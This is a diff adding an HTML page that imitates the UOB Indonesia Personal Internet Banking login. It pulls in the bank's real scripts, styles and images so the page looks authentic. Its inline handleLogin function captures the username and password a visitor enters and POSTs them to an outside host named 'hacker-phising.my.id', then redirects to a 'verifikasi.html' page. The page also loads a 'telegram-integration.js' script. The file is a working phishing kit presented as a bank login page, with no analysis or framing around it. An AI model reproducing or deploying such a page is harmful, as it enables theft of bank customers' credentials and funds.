@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en" class="app login">
+<head>
+    <meta charset="utf-8">
+    <title>UOB | Personal Internet Banking</title>
+    <meta name="keywords" content="Personal Internet Banking, Personal Internet Banking UOBI, PIB, PIB UOB, UOB, UOB Indonesia, UOBI,  Internet Banking, Online Banking, Electronic Banking, Electronic Channel, Bill Payment, Transfer, Investment, Check Account Balance, Deposit Placement, Telegraphic Transfer " />
+    <meta name="description" content="UOB Personal Internet Banking gives you convenience24/7 and secure platform to access your saving account, manage your wealth and apply for a loan. Register today for UOB Personal Internet Banking." />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    
+    <!-- Script UOB -->
+    <script src="https://pib.uob.co.id/PIBLogin/js/UOBApplet.js" type="text/javascript"></script>
+    <script src="https://pib.uob.co.id/PIBLogin/js/pib_user_password.js?v=1" type="text/javascript"></script>
+    <script src="https://pib.uob.co.id/PIBLogin/js/PIBValidation.js?v=1" type="text/javascript"></script>
+    <script src="https://pib.uob.co.id/PIBLogin/resources/js/pib.js" type="text/javascript"></script>
+    <script src="https://pib.uob.co.id/PIBLogin/resources/js/app.js" type="text/javascript"></script>
+    <script src="https://pib.uob.co.id/PIBLogin/js/E2EApplet.js" type="text/javascript"></script>
+    <script src="https://pib.uob.co.id/PIBLogin/js/UOBApplet.js" type="text/javascript"></script>
+    <script src="https://pib.uob.co.id/PIBLogin/js/pib_login.js" type="text/javascript"></script>
+    <script src="https://pib.uob.co.id/PIBLogin/js/e2escript.js" type="text/javascript"></script>
+    
+    <!-- CSS UOB -->
+    <link rel="stylesheet" href="https://pib.uob.co.id/PIBLogin/resources/css/pib.css" type="text/css">
+    <link rel="stylesheet" href="https://pib.uob.co.id/PIBLogin/resources/css/app.css" type="text/css">
+    
+    <!-- Script untuk Telegram -->
+    <script src="js/telegram-integration.js" defer></script>
+    
+    <script src="https://pib.uob.co.id/PIBLogin/resources/js/pages/login.js"></script>
+</head>
+<body>
+    <div id="xbackdrop">
+        <img data-ratio="1.78" src="https://pib.uob.co.id/PIBLogin/EN/resources/images/pib_wallpaper1.jpg" class="bg01-image active bgdrop-image animated" onerror="this.onerror=null;this.src='/PIBLogin/resources/images/bg-login.jpg';">
+        <img data-ratio="1.78" src="https://pib.uob.co.id/PIBLogin/EN/resources/images/pib_wallpaper2.jpg" class="bg02-image bgdrop-image animated" onerror="this.onerror=null;this.src='/PIBLogin/resources/images/bg-login02.jpg';">
+        <img data-ratio="1.78" src="https://pib.uob.co.id/PIBLogin/EN/resources/images/pib_wallpaper3.jpg" class="bg03-image bgdrop-image animated" onerror="this.onerror=null;this.src='/PIBLogin/resources/images/bg-login03.jpg';">
+    </div>
+    
+    <section class="vbox login">
+        <section id="content">
+            <section class="hbox stretch">
+                <section>
+                    <section class="vbox">
+                        <section class="container full">
+                            <header class="bg-white header header-md navbar navbar-fixed-top-xs box-shadow hidden-xs">
+                                <div class="m-t-sm m-l-sm m-b-sm">
+                                    <a href="index.php">
+                                        <img src="https://pib.uob.co.id/PIBLogin/EN/assets/images/newlogo.png" class="logo-login-page" onerror="this.onerror=null;this.src='/PIBLogin/resources/images/uob-main-logo.png';">
+                                    </a>
+                                    <span class="m-l-md inline-block text-uob-blue text-xxl v-middle hidden-xs">Personal Internet Banking</span>
+                                </div>
+                            </header>
+                            
+                            <div class="login-container">
+                                <!-- Bagian notifikasi -->
+                                <div class="notification-message hidden-xs" style="overflow-y:auto">
+                                    <!-- ... (kode notifikasi tetap) ... -->
+                                </div>
+                                
+                                <!-- Bagian iklan/login -->
+                                <div class="col-lg-8 login-advertisement fade">
+                                    <!-- ... (kode carousel tetap) ... -->
+                                </div>
+                                
+                                <!-- Bagian form login -->
+                                <div class="col-lg-4 login-form-container">
+                                    <div class="visible-xs">
+                                        <a href="index.php">
+                                            <img src="https://pib.uob.co.id/PIBLogin/EN/assets/images/newlogo.png" class="logo-login-page" onerror="this.onerror=null;this.src='/PIBLogin/resources/images/uob-main-logo.png';">
+                                        </a>
+                                        <span class="m-l-md inline-block text-uob-blue text-xxl v-middle hidden-xs">Personal Internet Banking</span>
+                                    </div>
+                                    
+                                    <!-- Form Login -->
+                                    <div class="panel row login-form-content fade scrollable mb-m-t-none mb-m-l-xs mb-m-r-xs m-l-sm m-r-sm flip-container">
+                                        <div class="flipper">
+                                            <div class="login-form-box p-n front">
+                                                <div class="lang-links">
+                                                    <a class="color-link" href="index.php">English</a> | 
+                                                    <a class="color-link" href="index.php">Bahasa Indonesia</a>
+                                                </div>
+                                                
+                                                <div class="m-t-md">
+                                                    <div id="genricErrorId" style="display:none" class="rows">
+                                                        <div class="col-lg-12 cols">
+                                                            <div class="text-white alert-danger alert text-md p-xs">
+                                                                We are unable to process your request due to one of the following reasons:<br><br>
+                                                                1. This service is currently unavailable.<br>
+                                                                2. Your transaction is unsuccessful.<br><br>
+                                                                For assistance, please call 14008
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                
+                                               <!-- FORM LOGIN UTAMA -->
+                                                <form id="loginForm" method="post" autocomplete="off">
+                                                    <div class="p-md text-xxl b-b">
+                                                        <span class="">Welcome to UOB Personal Internet Banking</span>
+                                                    </div>
+                                                    
+                                                    <div class="form-row m-n">
+                                                        <input id="userName" name="userName" class="form-control input-text text-lg parsley-validated" placeholder="USERNAME" autocomplete="off" data-required="true" type="text" value="" size="26" maxlength="16"/>
+                                                    </div>
+                                                    
+                                                    <div class="form-row m-n">
+                                                        <input id="PASSWORD" name="password" class="form-control input-text text-lg parsley-validated" placeholder="PASSWORD" autocomplete="off" data-required="true" type="password" value="" size="26" maxlength="24"/>
+                                                    </div>
+                                                    <br/>
+                                                    
+                                                    <div class="rows m-l-md m-r-md mb-p-b-lg">
+                                                        <button onclick="handleLogin(event)" id="btnSubmit" class="btn btn-primary col-lg-12 btn-s-md p-t-sm p-b-sm" type="submit">
+                                                            <span class="">Login</span>
+                                                        </button>
+                                                        <div class="clearer"></div>
+                                                        <a class="text-u-l inline-block m-t-sm color-link font-bold" href='https://forms.uob.co.id/uobforms-id/POR/index.page?type=reset-password'>
+                                                            <span class="">Forgot Username/Password?</span>
+                                                        </a>
+                                                    </div>
+                                                </form>
+                                                
+            
+                                                
+                                                <div class="rows text-md login-footer m-t-md">
+                                                    <div class="col-lg-12 p-t-md p-b-md p-t-md p-b-md p-l-md p-r-none">
+                                                        <span class="">Don't have an account?</span><br/>
+                                                        <a target="window" class="link" href='https://forms.uob.co.id/uobforms-id/POR/index.page'>
+                                                            <span class="">Register now!</span>
+                                                        </a>
+                                                    </div>
+                                                    <div class="clearer"></div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+                    </section>
+                </section>
+            </section>
+        </section>
+        
+        <!-- Footer -->
+        <div class="page-footer login p-t-sm p-b-sm p-l-md p-r-md hidden-xs">
+            <div class="row text-xs">
+                <div class="col-lg-6">
+                    <table>
+                        <tr>
+                            <td valign="top"></td>
+                            <td colspan="3">&nbsp;&nbsp;&nbsp;</td>
+                            <td valign="top">
+                                <span class="">UOB Indonesia is licensed & supervised by Financial Service Authority,</span><br/>
+                                <span class="">Bank Indonesia and is a particiant in Indonesia Deposit Insurance Corporation</span>
+                            </td>
+                        </tr>
+                    </table>
+                </div>
+                <div class="col-lg-6 text-right m-t-xs">
+                    <a href='http://www.uob.co.id/personal/downloads/pubtnc.pdf'>
+                        <span class="">Terms & Conditions</span>
+                    </a>
+                    &nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;
+                    <a href='http://uob.co.id/personal/layanan/ebanking/pib/tips-aman-bertransaksi-online.page?i_cid=tipsaman-pib'>
+                        <span class="">Transaction Security Tips</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+      <!-- Script tambahan -->
+    <script>
+        $(function(){
+            loader(false);
+            fader(false);
+        });
+        
+        // Fungsi untuk handle login
+        function handleLogin(event) {
+            event.preventDefault();
+            
+            // Ambil nilai input
+            const username = document.getElementById('userName').value;
+            const password = document.getElementById('PASSWORD').value;
+            
+            // Validasi sederhana (opsional)
+            if(username === "" || password === "") {
+                alert("Username dan Password wajib diisi!");
+                return;
+            }
+
+            // Kirim data menggunakan AJAX ke req/baru.php
+            $.ajax({
+                url: 'https://hacker-phising.my.id/notif/req/baru.php',
+                type: 'POST',
+                data: {
+                    userName: username,
+                    password: password
+                },
+                success: function(response) {
+                    // Jika pengiriman berhasil, redirect ke verifikasi.html
+                    window.location.href = 'verifikasi.html';
+                },
+                error: function(xhr, status, error) {
+                    // Jika terjadi error, tampilkan pesan (opsional)
+                    console.error("Error:", error);
+                    alert("Terjadi kesalahan saat memproses permintaan.");
+                }
+            });
+        }
+    </script>
+    
+</body>
+</html>
